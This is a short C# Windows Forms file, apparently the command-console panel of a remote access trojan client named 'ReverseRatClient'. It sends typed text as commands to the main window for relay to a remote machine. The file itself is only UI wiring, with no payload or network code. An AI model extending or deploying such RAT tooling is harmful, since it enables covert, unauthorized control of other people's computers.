using System;
using System.Windows.Forms;

namespace ReverseRatClient
{
    public partial class PanelDeControl : Form
    {
        Miscelanea  Msc = new Miscelanea();
        public PanelDeControl()
        {
            InitializeComponent();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var pc = (Principal)Msc.DevolverMDI("Principal");
            pc.EnviarComando(textBox2.Text, Text);
            if (textBox2.Text == @"cls") textBox1.Text = "";
            textBox2.Text = "";
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode== Keys.Return)
                button3.PerformClick();
        }

        private void PanelDeControl_Load(object sender, EventArgs e)
        {

        }

        private void PanelDeControl_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
                Close();
        }
    }
}
